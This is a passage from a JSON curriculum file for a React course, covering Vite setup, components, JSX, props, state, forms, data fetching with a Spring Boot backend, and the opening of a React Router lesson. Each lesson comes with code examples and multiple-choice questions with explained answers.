              "content": "Vite (French for 'fast') is the modern way to create React projects:\n\n# Create new project\nnpm create vite@latest my-app -- --template react\n\n# Navigate into project\ncd my-app\n\n# Install dependencies\nnpm install\n\n# Start development server\nnpm run dev\n\nYour app runs at http://localhost:5173\n\nPROJECT STRUCTURE:\nmy-app/\n├── index.html          # Entry HTML file\n├── package.json        # Dependencies and scripts\n├── vite.config.js      # Vite configuration\n├── src/\n│   ├── main.jsx        # React entry point\n│   ├── App.jsx         # Root component\n│   ├── App.css         # Styles for App\n│   └── index.css       # Global styles\n└── public/             # Static assets\n\nWHY VITE?\n- Instant server start (no bundling during dev)\n- Lightning-fast hot module replacement (HMR)\n- Optimized production builds\n- Modern ES modules support\n- Used by Vue, Svelte, and now React community"
            },
            {
              "type": "KEY_POINT",
              "title": "Components: The Building Blocks",
              "content": "React apps are built from COMPONENTS - reusable pieces of UI:\n\nfunction Welcome() {\n    return <h1>Hello, World!</h1>;\n}\n\nA component is:\n- A JavaScript function\n- Returns JSX (HTML-like syntax)\n- Name starts with CAPITAL letter\n- Can be reused anywhere\n\nCOMPONENT HIERARCHY:\n\nApp\n├── Header\n│   ├── Logo\n│   └── Navigation\n├── MainContent\n│   ├── UserList\n│   │   └── UserCard (repeated)\n│   └── Sidebar\n└── Footer\n\nEach component manages its own piece of the UI. Changes in one component don't affect others (unless they share data).\n\nUSING COMPONENTS:\n\nfunction App() {\n    return (\n        <div>\n            <Header />\n            <MainContent />\n            <Footer />\n        </div>\n    );\n}\n\nComponents are like LEGO blocks - snap them together to build complex UIs."
            },
            {
              "type": "THEORY",
              "title": "JSX: HTML in JavaScript",
              "content": "JSX lets you write HTML-like syntax in JavaScript:\n\n// This looks like HTML, but it's JSX!\nfunction Greeting() {\n    return (\n        <div className=\"greeting\">\n            <h1>Hello!</h1>\n            <p>Welcome to React.</p>\n        </div>\n    );\n}\n\nKEY DIFFERENCES FROM HTML:\n\n1. className instead of class:\n<div className=\"container\">  // Not class=\"container\"\n\n2. camelCase for attributes:\n<button onClick={handleClick}>  // Not onclick\n<input tabIndex={1}>            // Not tabindex\n\n3. JavaScript expressions in curly braces:\nconst name = \"John\";\n<h1>Hello, {name}!</h1>         // Outputs: Hello, John!\n<p>2 + 2 = {2 + 2}</p>          // Outputs: 2 + 2 = 4\n\n4. Self-closing tags required:\n<img src=\"photo.jpg\" />          // Not <img src=\"photo.jpg\">\n<input type=\"text\" />\n\n5. Must return single parent element:\n// WRONG - multiple roots\nreturn (\n    <h1>Title</h1>\n    <p>Content</p>\n);\n\n// RIGHT - single parent\nreturn (\n    <div>\n        <h1>Title</h1>\n        <p>Content</p>\n    </div>\n);\n\n// Or use Fragment\nreturn (\n    <>\n        <h1>Title</h1>\n        <p>Content</p>\n    </>\n);"
            },
            {
              "type": "EXAMPLE",
              "title": "Props: Passing Data to Components",
              "content": "Props (properties) let you pass data from parent to child components:",
              "code": "// UserCard component receives props\nfunction UserCard({ name, email, avatar }) {\n    return (\n        <div className=\"user-card\">\n            <img src={avatar} alt={name} />\n            <h3>{name}</h3>\n            <p>{email}</p>\n        </div>\n    );\n}\n\n// Parent component passes props\nfunction UserList() {\n    return (\n        <div className=\"user-list\">\n            <UserCard \n                name=\"Alice Johnson\" \n                email=\"alice@example.com\"\n                avatar=\"/avatars/alice.jpg\"\n            />\n            <UserCard \n                name=\"Bob Smith\" \n                email=\"bob@example.com\"\n                avatar=\"/avatars/bob.jpg\"\n            />\n        </div>\n    );\n}\n\n// Rendering a list from data\nfunction UserListFromData({ users }) {\n    return (\n        <div className=\"user-list\">\n            {users.map(user => (\n                <UserCard \n                    key={user.id}  // Required for lists!\n                    name={user.name}\n                    email={user.email}\n                    avatar={user.avatar}\n                />\n            ))}\n        </div>\n    );\n}\n\n// Usage\nconst users = [\n    { id: 1, name: \"Alice\", email: \"alice@example.com\", avatar: \"/a.jpg\" },\n    { id: 2, name: \"Bob\", email: \"bob@example.com\", avatar: \"/b.jpg\" }\n];\n\n<UserListFromData users={users} />",
              "language": "jsx"
            },
            {
              "type": "KEY_POINT",
              "title": "Props Rules",
              "content": "PROPS ARE READ-ONLY:\n\n// WRONG - never modify props!\nfunction BadComponent(props) {\n    props.name = \"Changed\";  // ERROR!\n    return <h1>{props.name}</h1>;\n}\n\n// RIGHT - props are immutable\nfunction GoodComponent({ name }) {\n    return <h1>{name}</h1>;\n}\n\nDATA FLOWS DOWN:\n\nApp (has user data)\n  ↓ passes via props\nUserProfile (receives user)\n  ↓ passes via props  \nUserAvatar (receives name, image)\n\nParent → Child only. Never upward directly (we'll learn how in next lesson).\n\nDEFAULT PROPS:\n\nfunction Button({ label = \"Click me\", color = \"blue\" }) {\n    return (\n        <button style={{ backgroundColor: color }}>\n            {label}\n        </button>\n    );\n}\n\n<Button />                    // Uses defaults\n<Button label=\"Submit\" />     // Custom label, default color\n<Button color=\"red\" />        // Default label, custom color\n\nCHILDREN PROP:\n\nfunction Card({ children, title }) {\n    return (\n        <div className=\"card\">\n            <h2>{title}</h2>\n            <div className=\"card-body\">\n                {children}\n            </div>\n        </div>\n    );\n}\n\n<Card title=\"Welcome\">\n    <p>This paragraph is passed as children!</p>\n    <button>Click me</button>\n</Card>"
            },
            {
              "type": "THEORY",
              "title": "Conditional Rendering",
              "content": "Show different UI based on conditions:\n\nIF/ELSE WITH TERNARY:\n\nfunction Greeting({ isLoggedIn, username }) {\n    return (\n        <div>\n            {isLoggedIn \n                ? <h1>Welcome back, {username}!</h1>\n                : <h1>Please sign in</h1>\n            }\n        </div>\n    );\n}\n\nSHORT-CIRCUIT WITH &&:\n\nfunction Notifications({ count }) {\n    return (\n        <div>\n            <h1>Dashboard</h1>\n            {count > 0 && (\n                <span className=\"badge\">{count} new messages</span>\n            )}\n        </div>\n    );\n}\n// If count is 0, nothing renders after Dashboard\n\nEARLY RETURN:\n\nfunction UserProfile({ user, isLoading }) {\n    if (isLoading) {\n        return <div>Loading...</div>;\n    }\n    \n    if (!user) {\n        return <div>User not found</div>;\n    }\n    \n    return (\n        <div>\n            <h1>{user.name}</h1>\n            <p>{user.email}</p>\n        </div>\n    );\n}\n\nRENDERING LISTS:\n\nfunction TodoList({ todos }) {\n    return (\n        <ul>\n            {todos.map(todo => (\n                <li key={todo.id} className={todo.done ? 'completed' : ''}>\n                    {todo.text}\n                </li>\n            ))}\n        </ul>\n    );\n}"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "react-lesson-2-mc-1",
              "title": "JSX Syntax",
              "description": "Understanding JSX differences from HTML",
              "question": "Which is the correct JSX for a div with a CSS class and a click handler?",
              "options": [
                "<div class=\"container\" onclick=\"handleClick()\">",
                "<div className=\"container\" onClick={handleClick}>",
                "<div class=\"container\" onClick={handleClick()}>",
                "<div className=\"container\" onclick={handleClick}>"
              ],
              "correctAnswer": 1,
              "explanation": "JSX uses className instead of class (reserved word in JavaScript), and camelCase for event handlers (onClick not onclick). Event handlers receive function references, not strings or function calls. handleClick (reference) not handleClick() (call) - calling it would execute immediately on render.",
              "difficulty": "beginner"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "react-lesson-2-mc-2",
              "title": "Props and Lists",
              "description": "Understanding the key prop in lists",
              "question": "When rendering a list with .map(), why is the key prop required?",
              "options": [
                "It's optional - just a best practice suggestion",
                "React uses it to identify which items changed, added, or removed for efficient updates",
                "It determines the order of elements in the list",
                "It's required for CSS styling to work properly"
              ],
              "correctAnswer": 1,
              "explanation": "React uses the key prop to identify list items during reconciliation (comparing old and new virtual DOM). Without keys, React re-renders all items when the list changes. With stable unique keys, React knows exactly which items changed and only updates those. Keys must be unique among siblings and stable across re-renders (don't use array index if list order can change).",
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "react-lesson-3",
          "title": "Lesson R.3: State & Events",
          "moduleId": "module-react",
          "order": 3,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Components Need Memory",
              "content": "Props are great for passing data DOWN. But what about data that CHANGES over time?\n\nfunction Counter() {\n    let count = 0;  // Local variable\n    \n    function handleClick() {\n        count++;  // This changes count...\n        console.log(count);  // Logs 1, 2, 3...\n    }\n    \n    return <button onClick={handleClick}>Count: {count}</button>;\n    // But UI always shows 0!\n}\n\nPROBLEMS:\n1. Local variables don't persist between renders\n2. Changing local variables doesn't trigger re-render\n\nReact re-renders when:\n- Props change (parent provides new values)\n- State changes (component's own data changes)\n\nLocal variables are RESET every render and DON'T trigger re-renders.\n\nSOLUTION: useState hook - gives components MEMORY that persists and triggers updates."
            },
            {
              "type": "KEY_POINT",
              "title": "useState: The State Hook",
              "content": "useState creates state that persists and triggers re-renders:\n\nimport { useState } from 'react';\n\nfunction Counter() {\n    const [count, setCount] = useState(0);\n    //     ↑        ↑              ↑\n    //  current  setter        initial\n    //  value    function      value\n    \n    function handleClick() {\n        setCount(count + 1);  // Updates state AND re-renders\n    }\n    \n    return <button onClick={handleClick}>Count: {count}</button>;\n    // Now UI updates!\n}\n\nRULES OF useState:\n\n1. Call at TOP of component (not in loops/conditions)\n// WRONG\nif (someCondition) {\n    const [value, setValue] = useState(0);  // Never do this!\n}\n\n// RIGHT\nconst [value, setValue] = useState(0);\nif (someCondition) {\n    // use value here\n}\n\n2. State is COMPONENT-LOCAL\n<Counter />  // Has its own count\n<Counter />  // Has its own count (independent)\n\n3. Setting state REPLACES the value (immutable)\nsetCount(5);  // count becomes 5, not count + 5"
            },
            {
              "type": "EXAMPLE",
              "title": "Common State Patterns",
              "content": "Different types of state and how to update them:",
              "code": "import { useState } from 'react';\n\nfunction StateExamples() {\n    // Primitive state\n    const [count, setCount] = useState(0);\n    const [name, setName] = useState('');\n    const [isOpen, setIsOpen] = useState(false);\n    \n    // Object state - must spread to update!\n    const [user, setUser] = useState({ name: '', email: '' });\n    \n    const updateEmail = (newEmail) => {\n        // WRONG: mutates state directly\n        // user.email = newEmail;\n        \n        // RIGHT: create new object\n        setUser({ ...user, email: newEmail });\n        // or\n        setUser(prev => ({ ...prev, email: newEmail }));\n    };\n    \n    // Array state - must create new array!\n    const [items, setItems] = useState([]);\n    \n    const addItem = (item) => {\n        // WRONG: mutates state\n        // items.push(item);\n        \n        // RIGHT: create new array\n        setItems([...items, item]);\n    };\n    \n    const removeItem = (id) => {\n        setItems(items.filter(item => item.id !== id));\n    };\n    \n    const updateItem = (id, newText) => {\n        setItems(items.map(item => \n            item.id === id ? { ...item, text: newText } : item\n        ));\n    };\n    \n    // Toggle boolean\n    const toggleOpen = () => setIsOpen(prev => !prev);\n    \n    // Increment with previous value\n    const increment = () => setCount(prev => prev + 1);\n    // Use callback form when new state depends on old state\n    \n    return (\n        <div>\n            <button onClick={increment}>Count: {count}</button>\n            <button onClick={toggleOpen}>\n                {isOpen ? 'Close' : 'Open'}\n            </button>\n        </div>\n    );\n}",
              "language": "jsx"
            },
            {
              "type": "THEORY",
              "title": "Event Handling",
              "content": "React events are camelCase and take function references:\n\nBASIC EVENTS:\n\n// Click\n<button onClick={handleClick}>Click me</button>\n\n// With parameter (use arrow function)\n<button onClick={() => handleDelete(item.id)}>Delete</button>\n\n// Event object\n<button onClick={(e) => {\n    e.preventDefault();  // Prevent default behavior\n    console.log(e.target);  // The clicked element\n}}>Submit</button>\n\nCOMMON EVENTS:\n\n// Mouse\nonClick, onDoubleClick, onMouseEnter, onMouseLeave\n\n// Keyboard\nonKeyDown, onKeyUp, onKeyPress\n\n// Form\nonChange, onSubmit, onFocus, onBlur\n\n// Touch\nonTouchStart, onTouchEnd, onTouchMove\n\nFORM EXAMPLE:\n\nfunction LoginForm() {\n    const [email, setEmail] = useState('');\n    const [password, setPassword] = useState('');\n    \n    const handleSubmit = (e) => {\n        e.preventDefault();  // Prevent page reload!\n        console.log('Login:', email, password);\n        // Call API here\n    };\n    \n    return (\n        <form onSubmit={handleSubmit}>\n            <input \n                type=\"email\" \n                value={email} \n                onChange={(e) => setEmail(e.target.value)} \n            />\n            <input \n                type=\"password\" \n                value={password} \n                onChange={(e) => setPassword(e.target.value)} \n            />\n            <button type=\"submit\">Login</button>\n        </form>\n    );\n}"
            },
            {
              "type": "KEY_POINT",
              "title": "Controlled Components",
              "content": "In React, form inputs should be CONTROLLED by state:\n\nUNCONTROLLED (avoid):\n<input type=\"text\" />  // React doesn't know the value\n\nCONTROLLED (preferred):\nconst [value, setValue] = useState('');\n<input \n    type=\"text\" \n    value={value}                          // Display state\n    onChange={(e) => setValue(e.target.value)}  // Update state\n/>\n\nWHY CONTROLLED?\n- Single source of truth (state)\n- Can validate/transform input\n- Can programmatically change value\n- React controls the input\n\nFORM WITH VALIDATION:\n\nfunction SignupForm() {\n    const [email, setEmail] = useState('');\n    const [error, setError] = useState('');\n    \n    const handleEmailChange = (e) => {\n        const value = e.target.value;\n        setEmail(value);\n        \n        // Validate as user types\n        if (value && !value.includes('@')) {\n            setError('Invalid email address');\n        } else {\n            setError('');\n        }\n    };\n    \n    return (\n        <div>\n            <input \n                type=\"email\" \n                value={email} \n                onChange={handleEmailChange}\n                className={error ? 'error' : ''}\n            />\n            {error && <span className=\"error-text\">{error}</span>}\n        </div>\n    );\n}"
            },
            {
              "type": "EXAMPLE",
              "title": "Complete Form Example",
              "content": "A practical login form with state management:",
              "code": "import { useState } from 'react';\n\nfunction LoginForm({ onLogin }) {\n    const [formData, setFormData] = useState({\n        email: '',\n        password: '',\n        rememberMe: false\n    });\n    const [errors, setErrors] = useState({});\n    const [isSubmitting, setIsSubmitting] = useState(false);\n    \n    const handleChange = (e) => {\n        const { name, value, type, checked } = e.target;\n        setFormData(prev => ({\n            ...prev,\n            [name]: type === 'checkbox' ? checked : value\n        }));\n        // Clear error when user types\n        if (errors[name]) {\n            setErrors(prev => ({ ...prev, [name]: '' }));\n        }\n    };\n    \n    const validate = () => {\n        const newErrors = {};\n        if (!formData.email) {\n            newErrors.email = 'Email is required';\n        } else if (!/\\S+@\\S+\\.\\S+/.test(formData.email)) {\n            newErrors.email = 'Email is invalid';\n        }\n        if (!formData.password) {\n            newErrors.password = 'Password is required';\n        } else if (formData.password.length < 6) {\n            newErrors.password = 'Password must be at least 6 characters';\n        }\n        setErrors(newErrors);\n        return Object.keys(newErrors).length === 0;\n    };\n    \n    const handleSubmit = async (e) => {\n        e.preventDefault();\n        if (!validate()) return;\n        \n        setIsSubmitting(true);\n        try {\n            await onLogin(formData);\n        } catch (error) {\n            setErrors({ submit: error.message });\n        } finally {\n            setIsSubmitting(false);\n        }\n    };\n    \n    return (\n        <form onSubmit={handleSubmit} className=\"login-form\">\n            <div className=\"form-group\">\n                <label htmlFor=\"email\">Email</label>\n                <input\n                    id=\"email\"\n                    name=\"email\"\n                    type=\"email\"\n                    value={formData.email}\n                    onChange={handleChange}\n                    className={errors.email ? 'error' : ''}\n                    disabled={isSubmitting}\n                />\n                {errors.email && <span className=\"error-text\">{errors.email}</span>}\n            </div>\n            \n            <div className=\"form-group\">\n                <label htmlFor=\"password\">Password</label>\n                <input\n                    id=\"password\"\n                    name=\"password\"\n                    type=\"password\"\n                    value={formData.password}\n                    onChange={handleChange}\n                    className={errors.password ? 'error' : ''}\n                    disabled={isSubmitting}\n                />\n                {errors.password && <span className=\"error-text\">{errors.password}</span>}\n            </div>\n            \n            <div className=\"form-group checkbox\">\n                <input\n                    id=\"rememberMe\"\n                    name=\"rememberMe\"\n                    type=\"checkbox\"\n                    checked={formData.rememberMe}\n                    onChange={handleChange}\n                    disabled={isSubmitting}\n                />\n                <label htmlFor=\"rememberMe\">Remember me</label>\n            </div>\n            \n            {errors.submit && <div className=\"error-banner\">{errors.submit}</div>}\n            \n            <button type=\"submit\" disabled={isSubmitting}>\n                {isSubmitting ? 'Logging in...' : 'Login'}\n            </button>\n        </form>\n    );\n}",
              "language": "jsx"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "react-lesson-3-mc-1",
              "title": "State Updates",
              "description": "Understanding how state updates work",
              "question": "What's wrong with this code?\nconst [user, setUser] = useState({ name: 'Alice', age: 25 });\nuser.age = 26;\nsetUser(user);",
              "options": [
                "Nothing - this correctly updates the age",
                "setUser should be called with user.age instead",
                "Mutating state directly won't trigger re-render; should spread: setUser({...user, age: 26})",
                "useState can't hold objects, only primitives"
              ],
              "correctAnswer": 2,
              "explanation": "This mutates the existing object then passes the same reference to setUser. React compares references for objects - since the reference is the same, React thinks nothing changed and won't re-render. Always create new objects/arrays: setUser({...user, age: 26}) creates a new object with the updated value.",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "react-lesson-3-mc-2",
              "title": "Controlled vs Uncontrolled",
              "description": "Understanding controlled form inputs",
              "question": "What makes this input 'controlled'?\n<input value={email} onChange={(e) => setEmail(e.target.value)} />",
              "options": [
                "The input has both value and onChange props",
                "React controls the input's value through state - the value prop always reflects state",
                "The onChange handler is an arrow function",
                "The input is inside a form element"
              ],
              "correctAnswer": 1,
              "explanation": "A controlled input has its value controlled by React state. The value prop displays the current state, and onChange updates the state. React is the 'single source of truth' - the DOM input's value always matches React's state. This allows React to validate, transform, or reject input changes.",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "react-lesson-4",
          "title": "Lesson R.4: Fetching Data",
          "moduleId": "module-react",
          "order": 4,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "Connecting to Your API",
              "content": "Your React frontend needs to fetch data from your Spring Boot backend:\n\n// Fetch users from Spring Boot API\nasync function getUsers() {\n    const response = await fetch('http://localhost:8080/api/users');\n    const users = await response.json();\n    return users;\n}\n\nTHE FETCH API:\n- Native browser API (no library needed)\n- Returns a Promise\n- Response must be parsed (.json(), .text(), etc.)\n- Doesn't throw on HTTP errors (4xx, 5xx)\n\nBASIC FETCH PATTERN:\n\ntry {\n    const response = await fetch(url);\n    \n    if (!response.ok) {\n        throw new Error(`HTTP error! status: ${response.status}`);\n    }\n    \n    const data = await response.json();\n    return data;\n} catch (error) {\n    console.error('Fetch failed:', error);\n    throw error;\n}\n\nFETCH OPTIONS:\n\nfetch(url, {\n    method: 'POST',              // GET, POST, PUT, DELETE\n    headers: {\n        'Content-Type': 'application/json',\n        'Authorization': 'Bearer ' + token\n    },\n    body: JSON.stringify(data),  // For POST/PUT\n    credentials: 'include'       // Include cookies (for sessions)\n});"
            },
            {
              "type": "KEY_POINT",
              "title": "useEffect: Side Effects in React",
              "content": "Components shouldn't fetch data during render. Use useEffect:\n\nimport { useState, useEffect } from 'react';\n\nfunction UserList() {\n    const [users, setUsers] = useState([]);\n    const [loading, setLoading] = useState(true);\n    const [error, setError] = useState(null);\n    \n    useEffect(() => {\n        // This runs AFTER render\n        async function fetchUsers() {\n            try {\n                const response = await fetch('/api/users');\n                if (!response.ok) throw new Error('Failed to fetch');\n                const data = await response.json();\n                setUsers(data);\n            } catch (err) {\n                setError(err.message);\n            } finally {\n                setLoading(false);\n            }\n        }\n        \n        fetchUsers();\n    }, []);  // Empty array = run once on mount\n    \n    if (loading) return <div>Loading...</div>;\n    if (error) return <div>Error: {error}</div>;\n    \n    return (\n        <ul>\n            {users.map(user => <li key={user.id}>{user.name}</li>)}\n        </ul>\n    );\n}\n\nDEPENDENCY ARRAY:\nuseEffect(() => { }, []);         // Run once on mount\nuseEffect(() => { }, [userId]);   // Run when userId changes\nuseEffect(() => { });             // Run on every render (usually wrong!)"
            },
            {
              "type": "EXAMPLE",
              "title": "Spring Boot CORS Configuration",
              "content": "Configure Spring Boot to allow requests from React:",
              "code": "// src/main/java/com/example/config/CorsConfig.java\n\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.web.servlet.config.annotation.CorsRegistry;\nimport org.springframework.web.servlet.config.annotation.WebMvcConfigurer;\n\n@Configuration\npublic class CorsConfig implements WebMvcConfigurer {\n    \n    @Override\n    public void addCorsMappings(CorsRegistry registry) {\n        registry.addMapping(\"/api/**\")\n            // Allow React dev server\n            .allowedOrigins(\"http://localhost:5173\")\n            // HTTP methods to allow\n            .allowedMethods(\"GET\", \"POST\", \"PUT\", \"DELETE\", \"OPTIONS\")\n            // Allow all headers\n            .allowedHeaders(\"*\")\n            // Allow cookies/credentials\n            .allowCredentials(true)\n            // Cache preflight for 1 hour\n            .maxAge(3600);\n    }\n}\n\n// For Spring Security, also add:\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n    \n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        return http\n            .cors(cors -> cors.configurationSource(corsConfigurationSource()))\n            .csrf(csrf -> csrf.disable())  // Disable for API\n            .authorizeHttpRequests(auth -> auth\n                .requestMatchers(\"/api/public/**\").permitAll()\n                .anyRequest().authenticated()\n            )\n            .build();\n    }\n    \n    @Bean\n    public CorsConfigurationSource corsConfigurationSource() {\n        CorsConfiguration configuration = new CorsConfiguration();\n        configuration.setAllowedOrigins(List.of(\"http://localhost:5173\"));\n        configuration.setAllowedMethods(List.of(\"GET\", \"POST\", \"PUT\", \"DELETE\"));\n        configuration.setAllowedHeaders(List.of(\"*\"));\n        configuration.setAllowCredentials(true);\n        \n        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();\n        source.registerCorsConfiguration(\"/api/**\", configuration);\n        return source;\n    }\n}",
              "language": "java"
            },
            {
              "type": "THEORY",
              "title": "Loading and Error States",
              "content": "Good UX requires handling all states:\n\nTHREE STATES OF DATA FETCHING:\n\n1. LOADING: Request in progress\n   - Show spinner or skeleton\n   - Disable form submissions\n   - Indicate progress\n\n2. SUCCESS: Data received\n   - Render the data\n   - Hide loading indicators\n\n3. ERROR: Request failed\n   - Show error message\n   - Offer retry option\n   - Log for debugging\n\nREUSABLE FETCH HOOK:\n\nfunction useFetch(url) {\n    const [data, setData] = useState(null);\n    const [loading, setLoading] = useState(true);\n    const [error, setError] = useState(null);\n    \n    useEffect(() => {\n        let isMounted = true;  // Prevent state update on unmounted component\n        \n        async function fetchData() {\n            try {\n                setLoading(true);\n                const response = await fetch(url);\n                if (!response.ok) throw new Error(`HTTP ${response.status}`);\n                const json = await response.json();\n                if (isMounted) {\n                    setData(json);\n                    setError(null);\n                }\n            } catch (err) {\n                if (isMounted) {\n                    setError(err.message);\n                }\n            } finally {\n                if (isMounted) {\n                    setLoading(false);\n                }\n            }\n        }\n        \n        fetchData();\n        \n        return () => { isMounted = false; };  // Cleanup\n    }, [url]);\n    \n    return { data, loading, error };\n}\n\n// Usage:\nconst { data: users, loading, error } = useFetch('/api/users');"
            },
            {
              "type": "EXAMPLE",
              "title": "Complete CRUD Example",
              "content": "Full example with Create, Read, Update, Delete operations:",
              "code": "import { useState, useEffect } from 'react';\n\nconst API_URL = 'http://localhost:8080/api/todos';\n\nfunction TodoApp() {\n    const [todos, setTodos] = useState([]);\n    const [newTodo, setNewTodo] = useState('');\n    const [loading, setLoading] = useState(true);\n    const [error, setError] = useState(null);\n    \n    // READ - Fetch all todos\n    useEffect(() => {\n        fetchTodos();\n    }, []);\n    \n    async function fetchTodos() {\n        try {\n            setLoading(true);\n            const response = await fetch(API_URL);\n            if (!response.ok) throw new Error('Failed to fetch todos');\n            const data = await response.json();\n            setTodos(data);\n        } catch (err) {\n            setError(err.message);\n        } finally {\n            setLoading(false);\n        }\n    }\n    \n    // CREATE - Add new todo\n    async function handleAdd(e) {\n        e.preventDefault();\n        if (!newTodo.trim()) return;\n        \n        try {\n            const response = await fetch(API_URL, {\n                method: 'POST',\n                headers: { 'Content-Type': 'application/json' },\n                body: JSON.stringify({ text: newTodo, completed: false })\n            });\n            if (!response.ok) throw new Error('Failed to create todo');\n            const created = await response.json();\n            setTodos([...todos, created]);\n            setNewTodo('');\n        } catch (err) {\n            setError(err.message);\n        }\n    }\n    \n    // UPDATE - Toggle completion\n    async function handleToggle(todo) {\n        try {\n            const response = await fetch(`${API_URL}/${todo.id}`, {\n                method: 'PUT',\n                headers: { 'Content-Type': 'application/json' },\n                body: JSON.stringify({ ...todo, completed: !todo.completed })\n            });\n            if (!response.ok) throw new Error('Failed to update todo');\n            const updated = await response.json();\n            setTodos(todos.map(t => t.id === updated.id ? updated : t));\n        } catch (err) {\n            setError(err.message);\n        }\n    }\n    \n    // DELETE - Remove todo\n    async function handleDelete(id) {\n        try {\n            const response = await fetch(`${API_URL}/${id}`, {\n                method: 'DELETE'\n            });\n            if (!response.ok) throw new Error('Failed to delete todo');\n            setTodos(todos.filter(t => t.id !== id));\n        } catch (err) {\n            setError(err.message);\n        }\n    }\n    \n    if (loading) return <div>Loading todos...</div>;\n    \n    return (\n        <div className=\"todo-app\">\n            <h1>Todo List</h1>\n            \n            {error && (\n                <div className=\"error\">\n                    {error}\n                    <button onClick={() => setError(null)}>Dismiss</button>\n                </div>\n            )}\n            \n            <form onSubmit={handleAdd}>\n                <input\n                    value={newTodo}\n                    onChange={(e) => setNewTodo(e.target.value)}\n                    placeholder=\"Add new todo...\"\n                />\n                <button type=\"submit\">Add</button>\n            </form>\n            \n            <ul>\n                {todos.map(todo => (\n                    <li key={todo.id} className={todo.completed ? 'completed' : ''}>\n                        <input\n                            type=\"checkbox\"\n                            checked={todo.completed}\n                            onChange={() => handleToggle(todo)}\n                        />\n                        <span>{todo.text}</span>\n                        <button onClick={() => handleDelete(todo.id)}>Delete</button>\n                    </li>\n                ))}\n            </ul>\n        </div>\n    );\n}",
              "language": "jsx"
            },
            {
              "type": "WARNING",
              "title": "Common Fetch Pitfalls",
              "content": "PITFALL 1: Forgetting error handling\n\n// BAD - no error handling\nconst data = await fetch(url).then(r => r.json());\n\n// GOOD - handle errors\nconst response = await fetch(url);\nif (!response.ok) {\n    const error = await response.text();\n    throw new Error(error || `HTTP ${response.status}`);\n}\n\nPITFALL 2: Missing Content-Type header\n\n// BAD - server may reject\nfetch(url, { method: 'POST', body: JSON.stringify(data) });\n\n// GOOD - specify content type\nfetch(url, {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify(data)\n});\n\nPITFALL 3: Forgetting to stringify body\n\n// BAD - sends [object Object]\nfetch(url, { method: 'POST', body: data });\n\n// GOOD - stringify objects\nfetch(url, { method: 'POST', body: JSON.stringify(data) });\n\nPITFALL 4: CORS misconfiguration\n\n// React shows: CORS error, blocked by policy\n// Check:\n// 1. Spring Boot has CORS config for http://localhost:5173\n// 2. allowCredentials matches your fetch config\n// 3. allowedMethods includes your HTTP method"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "react-lesson-4-mc-1",
              "title": "useEffect Dependencies",
              "description": "Understanding when useEffect runs",
              "question": "What's the difference between useEffect(() => {...}, []) and useEffect(() => {...}, [userId])?",
              "options": [
                "No difference - both run once on mount",
                "[] runs once on mount; [userId] runs on mount AND whenever userId changes",
                "[userId] only runs when userId changes, not on mount",
                "[] is for GET requests, [userId] is for POST requests"
              ],
              "correctAnswer": 1,
              "explanation": "Empty array [] means the effect runs once when the component mounts. [userId] means the effect runs on mount AND re-runs whenever userId changes. This is how you fetch data that depends on a parameter - when the parameter changes, you refetch.",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "react-lesson-4-mc-2",
              "title": "CORS Configuration",
              "description": "Understanding CORS for React + Spring Boot",
              "question": "Your React app at localhost:5173 gets a CORS error when calling your Spring Boot API. What's the MOST LIKELY cause?",
              "options": [
                "React doesn't support cross-origin requests",
                "Spring Boot's CorsConfig doesn't include 'http://localhost:5173' in allowedOrigins",
                "The fetch call is missing the 'cors' mode option",
                "You need to use axios instead of fetch for CORS to work"
              ],
              "correctAnswer": 1,
              "explanation": "CORS errors occur when the server doesn't explicitly allow the client's origin. Spring Boot must have CorsConfig (or @CrossOrigin) that includes 'http://localhost:5173' in allowedOrigins. The browser blocks requests that don't have proper CORS headers in the response. React/fetch/axios all support CORS - it's a server configuration issue.",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "react-lesson-5",
          "title": "Lesson R.5: React Router",
          "moduleId": "module-react",
          "order": 5,
          "estimatedMinutes": 35,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Single Page Apps Need Routes",
              "content": "React creates Single Page Applications (SPAs). The browser loads ONE HTML page, and React handles all the UI changes.\n\nBut users expect:\n- Different URLs for different views (/home, /about, /users/123)\n- Browser back/forward buttons to work\n- Bookmarkable pages\n- Shareable links\n\nWITHOUT ROUTING:\nfunction App() {\n    const [page, setPage] = useState('home');\n    \n    return (\n        <div>\n            <nav>\n                <button onClick={() => setPage('home')}>Home</button>\n                <button onClick={() => setPage('about')}>About</button>\n            </nav>\n            {page === 'home' && <HomePage />}\n            {page === 'about' && <AboutPage />}\n        </div>\n    );\n}\n// Problems:\n// - URL doesn't change (always http://localhost:5173/)\n// - Can't bookmark pages\n// - Back button doesn't work\n// - Can't share links to specific pages\n\nREACT ROUTER solves this by syncing the URL with your components."
            },
            {
              "type": "KEY_POINT",
              "title": "Setting Up React Router",
